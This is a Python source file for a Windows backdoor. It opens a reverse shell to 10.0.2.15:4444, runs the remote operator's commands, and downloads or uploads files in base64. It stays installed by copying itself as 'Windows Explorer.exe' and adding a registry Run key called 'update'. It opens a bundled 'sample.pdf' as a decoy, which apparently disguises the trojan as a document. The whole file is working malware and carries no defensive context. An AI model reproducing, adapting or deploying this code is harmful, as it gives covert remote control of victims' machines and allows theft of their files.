#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64
import shutil
import sys

class Backdoor:
	def __init__(self, ip, port):
		self.become_persistent()
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	def become_persistent(self):
		file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
		if not os.path.exists(file_location):
			shutil.copyfile(sys.executable, file_location)
			subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "' + file_location, shell=True)

	def reliable_send(self, data):
		json_data = json.dumps(data, encoding="ISO-8859-1")
		self.connection.send(json_data)

	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data += self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	def execute_system_command(self, command):
		DEVNULL = open(os.devnull, 'wb')
		try:
			return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
		except subprocess.CalledProcessError:
			return "[-] Error Process execution failed"

	def change_working_directory_to(self, path):
		os.chdir(path)
		return "[+] Changing working directory to " + path

	def read_file(self, path):
		with open(path, "rb") as f:
			return base64.b64encode(f.read())

	def write_file(self, path, content):
		with open(path, "wb") as f:
			f.write(base64.b64decode(content))
			return "[+] upload successful."

	def parse_command(self, command):
		if command[0] == "cd" and len(command) > 1:
			command_result = self.change_working_directory_to(command[1])
		elif command[0] == "download" and len(command) > 1:
			command_result = self.read_file(command[1])
		elif command[0] == "upload":
			print("upload")
			command_result = self.write_file(command[1], command[2])
		else:
			command_result = self.execute_system_command(command)

		return command_result

	def run(self):
		while True:
			try:
				command = self.reliable_receive()
				if command[0] == "exit":
					break
				else:
					result = self.parse_command(command)
			except Exception:
				result = "[-] Error command error occured"
			self.reliable_send(result)

		self.connection.close()


file_name= sys._MEIPASS + "\\sample.pdf"
subprocess.Popen(file_name, shell=True)

try:
	backdoor = Backdoor("10.0.2.15", 4444)
	backdoor.run()
except Exception:
	sys.exit()
